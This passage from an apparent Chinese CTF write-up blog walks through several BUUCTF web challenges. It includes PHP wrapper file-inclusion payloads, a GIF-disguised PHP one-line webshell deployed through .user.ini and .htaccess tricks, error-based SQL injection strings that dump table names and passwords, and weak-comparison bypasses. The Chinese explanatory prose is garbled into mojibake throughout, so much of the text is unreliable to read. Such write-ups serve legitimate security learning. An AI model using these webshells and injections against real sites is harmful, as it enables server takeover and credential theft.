·å¯ä»¥ä½¿ç”¨ä¸Šé¢çš„æ•°ç»„ç»•è¿‡ï¼Œå¾—åˆ°flagã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054292.png"></p><p><font color="#FF5E3A" size="3">md5æ¯”è¾ƒç»•è¿‡ï¼š</font></p><p><a href="https://www.cnblogs.com/ainsliaea/p/15126218.html">https://www.cnblogs.com/ainsliaea/p/15126218.html</a></p><p><a href="https://blog.csdn.net/CSDNiamcoming/article/details/108837347">https://blog.csdn.net/CSDNiamcoming/article/details/108837347</a></p><h2 id="23-ZJCTF-2019-NiZhuanSiWei"><a href="#23-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="23.[ZJCTF 2019]NiZhuanSiWei"></a>23.[ZJCTF 2019]NiZhuanSiWei</h2><p>æºç ï¼š<a href="https://github.com/CTFTraining/zjctf_2019_final_web_nizhuansiwei/">https://github.com/CTFTraining/zjctf_2019_final_web_nizhuansiwei/</a></p><p>è€ƒå¯Ÿçš„æ˜¯PHPä¼ªåè®®ã€ä»¥åŠååºåˆ—åŒ–çš„é­”æ³•å‡½æ•°ã€‚ï¼ˆé‡ç‚¹æ˜¯<code>dataåè®®</code>å®¹æ˜“å¿˜è®°ï¼‰</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token double-quoted-string string">"welcome to the zjctf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br&gt;&lt;h1&gt;"</span><span class="token punctuation">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;/h1&gt;&lt;/br&gt;"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Not now!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//useless.php</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$password</span><span class="token punctuation">;</span> <span class="token comment">//ä¼šè§¦å‘é­”æ³•å‡½æ•°__tostring</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆæ˜¯textå‚æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰å…¶ä»–çš„æ–‡ä»¶å¯ä»¥è¯»ï¼Œæ‰€ä»¥ä½¿ç”¨<code>dataåè®®</code>ï¼š</p><p><strong>æ¡ä»¶</strong>ï¼š</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul><p><strong>ä½œç”¨</strong>ï¼šè‡ª<code>PHP&gt;=5.2.0</code>èµ·ï¼Œå¯ä»¥ä½¿ç”¨<code>data://</code>æ•°æ®æµå°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ã€‚é€šå¸¸å¯ä»¥ç”¨æ¥æ‰§è¡ŒPHPä»£ç ã€‚</p><p><strong>ç”¨æ³•</strong>ï¼š</p><pre class="line-numbers language-awk" data-language="awk"><code class="language-awk">data://text/plain,data://text/plain;base64,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç›¸å…³ä¼ªåè®®iè¯¦ç»†ä»‹ç»ï¼š<a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a></p><p>æ‰€ä»¥payload:?text=data://text/plain,welcome to the zjctfï¼Œå°±å¯ä»¥æ»¡è¶³ç¬¬ä¸€ä¸ªåˆ¤æ–­ã€‚ç„¶åå°±è¦è¯»useless.phpï¼Œå¦‚æœç›´æ¥è¯»æ— æ³•æ˜¾ç¤ºï¼Œæ‰€ä»¥ä¼ªåè®®è¯»å–ï¼šfile=php://filter/read=convert.base64-encode/resource=useless.phpï¼Œè¯»åˆ°ä¹‹åè§£å¯†ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token keyword">class</span> <span class="token class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment">//flag.php  </span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>      <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"U R SO CLOSE !///COME ON PLZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token delimiter important">?&gt;</span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> è¦æƒ³è¯»åˆ°flagï¼Œå°±æŠŠfileèµ‹å€¼ä¸ºflag.phpï¼Œç„¶ååºåˆ—åŒ–ä½œä¸ºå‚æ•°passwordå€¼ä¼ è¿›å»å°±å¥½ã€‚</p><h2 id="24-SUCTF-2019-CheckIn"><a href="#24-SUCTF-2019-CheckIn" class="headerlink" title="24.[SUCTF 2019]CheckIn"></a>24.[SUCTF 2019]CheckIn</h2><p>åˆæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œä¸è¿‡åˆéš¾å€’æˆ‘äº†ã€‚é¦–å…ˆè¿™ä¸ªé¢˜æœ‰æºï¼Œå…ˆæ¥åˆ†æä¸€ä¸‹ï¼š</p><p>æºç åœ°å€ï¼š<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">if (isset($_POST["upload"])) {    $tmp_name = $_FILES["fileUpload"]["tmp_name"];    $name = $_FILES["fileUpload"]["name"];    if (!$tmp_name) {        die("filesize too big!");    }    if (!$name) {        die("filename cannot be empty!");    }    //æ–‡ä»¶åç¼€ä¸èƒ½æœ‰phå¼€å¤´çš„ï¼Œå¹¶ä¸”å¿½ç•¥äº†å¤§å°å†™    $extension = substr($name, strrpos($name, ".") + 1);    if (preg_match("/ph|htacess/i", $extension)) {        die("illegal suffix!");    }    //æ–‡ä»¶å†…å®¹ä¸­ä¸èƒ½æœ‰"&lt;?"    if (mb_strpos(file_get_contents($tmp_name), "&lt;?") !== FALSE) {        die("<span class="token entity named-entity" title="<">&amp;lt;</span>? in contents!");    }    //exif_imagetype() è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚å¯ä»¥åˆ©ç”¨åˆ©ç”¨GIF89aæ–‡ä»¶å¤´ç»•è¿‡ï¼ˆå¯¹åº”jpgåç¼€ï¼‰    $image_type = exif_imagetype($tmp_name);    if (!$image_type) {        die("exif_imagetype:not image!");    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥ä»ä¸Šé¢çš„è¿‡æ»¤æˆ‘ä»¬å¯ä»¥çŸ¥é“è¦ä¸Šä¼ å›¾ç‰‡æœ¨é©¬ï¼Œåˆ¶ä½œä¸€ä¸ªå›¾ç‰‡æœ¨é©¬shell.jpgï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token single-quoted-string string">'php'</span><span class="token operator">&gt;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½†æ˜¯èšå‰‘ä¸èƒ½è¿æ¥å›¾ç‰‡æ–‡ä»¶ï¼Œæ‰€ä»¥è¿˜ä¸èƒ½ç›´æ¥è¿ï¼Œåœ¨è¿™é‡Œå°±å¡ç€äº†ã€‚çœ‹äº†åˆ«äººçš„wpå¯ä»¥ä¸Šä¼ ä¸€ä¸ªé…ç½®æ–‡ä»¶<code>.user.ini</code></p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">GIF89a                  <span class="token constant">auto_prepend_file</span><span class="token attr-value"><span class="token punctuation">=</span>shell.jpg </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><p><strong>ä½¿ç”¨æ¡ä»¶ï¼š</strong><br> (1)æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP<br> (2)<font color="#FF5E3A" size="3">å¯¹åº”ç›®å½•ä¸‹é¢æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶</font><br> (3)æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼</p><p><code>.user.ini</code>å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„<code>php.ini</code>ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰é™¤äº†<code>PHP_INI_SYSTEM</code>ä»¥å¤–çš„æ¨¡å¼ï¼Œåœ¨æ‰§è¡Œphpä»£ç ä¹‹å‰ï¼Œç³»ç»Ÿä¼šå¯¹<code>.user.ini</code>å…ˆåšä¸€ä¸ªæ‰§è¡Œï¼Œç„¶åæ‰æ‰§è¡Œå…¶ä»–çš„phpæ–‡ä»¶ã€‚</p><p>æˆ‘ä»¬è¿™è¾¹åˆ©ç”¨<code>.user,ini</code>å…ˆæ‰§è¡Œ<code>auto_prepend_file</code>å‡½æ•°ï¼Œ<code>auto_prepend_file</code>è¡¨ç¤ºåœ¨phpç¨‹åºåŠ è½½ç¬¬ä¸€ä¸ªphpä»£ç å‰åŠ è½½çš„phpæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å…ˆåŠ è½½äº†shell.jpgé‡Œé¢çš„æ–‡ä»¶ï¼Œå³ä¸€å¥è¯æœ¨é©¬ã€‚</p><p>æŠŠè¿™ä¸¤ä¸ªæ–‡ä»¶ä¸Šä¼ ä¹‹åå°±å¯ä»¥ä½¿ç”¨èšå‰‘è¿æ¥äº†ï¼Œè¿™é‡Œè®°ä½è®¿é—®çš„æ—¶<code>index.php</code>ï¼è¿™æ ·æ‰æœ‰ç”¨ï¼Œå°±æ˜¯ä½¿ç”¨æ¡ä»¶çš„ç¬¬äºŒä¸ªã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054293.png"></p><h2 id="25-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL"><a href="#25-æå®¢å¤§æŒ‘æˆ˜-2019-HardSQL" class="headerlink" title="25.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL"></a>25.[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</h2><p>è¿™é¢˜è¦æå‰çŸ¥é“ä¸€äº›çŸ¥è¯†ç‚¹ï¼š</p><ul><li>^  ç­‰åŒäº and </li><li>ï¼ˆï¼‰æ¥ä»£æ›¿ç©ºæ ¼</li><li>like  æ¥ä»£æ›¿=å·</li></ul><p>é¦–å…ˆå°è¯•<code>1' #</code>ï¼Œå‘ç°è¿”å›è¢«é€®ä½è¯´æ˜ä»€ä¹ˆè¢«è¿‡æ»¤äº†ï¼Œå†æ¬¡å°è¯•<code>1'#</code>ï¼Œå¯ä»¥äº†ï¼Œ<font color="#FF5E3A" size="3">è¯´æ˜è¿‡æ»¤äº†ç©ºæ ¼</font>ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–è¢«è¿‡æ»¤çš„è‡ªå·±è¯•è¯•å°±çŸ¥é“äº†ã€‚ç„¶åæ ¹æ®å‰é¢çš„æç¤ºå¯çŸ¥è¿”å›çš„éƒ½æ˜¯åŒä¸€æŠ¥é”™ä¿¡æ¯ï¼Œç±»ä¼¼trueå’Œfalseï¼Œ<font color="#FF5E3A" size="3">å°è¯•æŠ¥é”™æ³¨å…¥</font>ã€‚</p><p>æŠ¥é”™æ³¨å…¥çŸ¥è¯†ç‚¹ï¼š<a href="https://blog.csdn.net/silence1_/article/details/90812612">https://blog.csdn.net/silence1_/article/details/90812612</a></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#payloadï¼š1'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)#  //çˆ†ç ´æ•°æ®åº“å1'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek')),0x7e),1)#   //çˆ†ç ´è¡¨å1'^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1)# //çˆ†ç ´åˆ—å1'^updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1)#   //çˆ†ç ´æ•°æ®ï¼Œå‘ç°åªæœ‰ä¸€åŠï¼Œç”¨rightå‡½æ•°è¾“å‡ºå¦ä¸€åŠ1'^updatexml(1,concat(0x7e,(select(right((password),30))from(H4rDsq1)),0x7e),1)#    //çˆ†ç ´å¦ä¸€æ®µæ•°æ®#left()   right()  å‡½æ•°ï¼ŒLEFT(ARG,LENGTH)ã€RIGHT(ARG,LENGTH)LEFTã€RIGHTå‡½æ•°è¿”å›ARGæœ€å·¦è¾¹ã€å³è¾¹çš„LENGTHä¸ªå­—ç¬¦ä¸²ï¼ŒARGå¯ä»¥æ˜¯CHARæˆ–BINARY STRING<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œæ³¨æ„ï¼Œåœ¨çˆ†ç ´æ•°æ®çš„æ—¶å€™ï¼Œ<code>select(right((password),30))from(H4rDsq1)</code>ï¼Œè¿™ä¸ª<font color="red" size="3">è¡¨åç»å¯¹ä¸å¯ä»¥æ‰“åŒå¼•å·!!!</font></p><h2 id="26-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#26-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="26.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>26.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>è¿™ä¸ªæ–‡ä»¶ä¸Šä¼ é¢˜ç›®å’Œä¸Šæ¬¡é‚£ä¸ªcheckinå·®ä¸å¤šä¹Ÿæ˜¯ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿æ­£å¸¸å›¾ç‰‡éƒ½ä¸Šä¼ ä¸äº†ï¼Œå¥½åƒåªèƒ½ä¸Šä¼ ä¸€å¥è¯çš„å›¾ğŸ¤ª</p><p>ä¸Šä¼ æˆåŠŸä¹‹åæ˜¾ç¤ºæ–‡ä»¶è·¯å¾„ï¼š/var/www/html/upload/3d785937f598842209769fd5c7df8958/2.jpgï¼Œä½†è¿™é‡Œæ˜¯ç»å¯¹è·¯å¾„å¹¶ä¸æ˜¯æˆ‘ä»¬ç›´æ¥æ·»åŠ åˆ°urlåé¢çš„ï¼Œä¸€èˆ¬éƒ½æ˜¯/upload/3d785937f598842209769fd5c7df8958/2.jpgï¼</p><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è§£ææˆ‘ä»¬çš„jpgæ–‡ä»¶ä¸ºPHPæ–‡ä»¶ï¼Œé‚£å°±æ˜¯æ›´æ”¹é…ç½®æ–‡ä»¶.htaccess:</p><p>.htaccessæ–‡ä»¶(æˆ–è€…â€åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶â€ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ  å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ  ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚æ¦‚è¿°æ¥è¯´ï¼Œ<a href="http://www.lvjiyong.com/tag/htaccess/">htaccess</a>æ–‡ä»¶æ˜¯<a href="http://www.lvjiyong.com/tag/apache/">Apache</a>æœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚è¯¦ç»†è®²è§£è§ï¼š<a href="https://blog.csdn.net/cmzhuang/article/details/53537591">https://blog.csdn.net/cmzhuang/article/details/53537591</a></p><p>æˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„å°±æ˜¯ä¸‹é¢è¿™ä¸ªï¼Œæ‰€æœ‰jpgæ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œï¼š</p><pre class="line-numbers language-none"><code class="language-none">ForceType application/x-httpd-phpSetHandler application/x-httpd-php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™é‡Œåœ¨ä¸Šä¼ é…ç½®æ–‡ä»¶æ—¶æ³¨æ„æŠ“åŒ…ä¿®æ”¹<code>Content-Type: image/jpeg</code>ï¼Œå¦åˆ™ä¸Šä¼ ä¸äº†ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202070953868.png"></p><p>ä¹‹åç›´æ¥è¿æ¥jpgæ–‡ä»¶å°±å¯ä»¥äº†ï¼Œflagåœ¨æ ¹ç›®å½•ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202070953870.png"></p><h2 id="27-MRCTF2020-Ez-bypass"><a href="#27-MRCTF2020-Ez-bypass" class="headerlink" title="27.[MRCTF2020]Ez_bypass"></a>27.[MRCTF2020]Ez_bypass</h2><p>è¿™é¢˜æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯å¼±æ¯”è¾ƒã€‚ç›´æ¥ç»™payloadï¼š/?gg[]=1&amp;id[]=2ã€‚ç„¶åpostçš„æ•°æ®ä¸ºï¼špasswd=1234567ağŸ˜‰</p><h2 id="28-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz"><a href="#28-ç½‘é¼æ¯-2020-é’é¾™ç»„-AreUSerialz" class="headerlink" title="28.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz"></a>28.[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</h2><p>è¯»æºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$op</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token shell-comment comment">#è¿™é‡Œæ˜¯å¼±æ¯”è¾ƒ</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">op</span> <span class="token operator">==</span> <span class="token double-quoted-string string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token 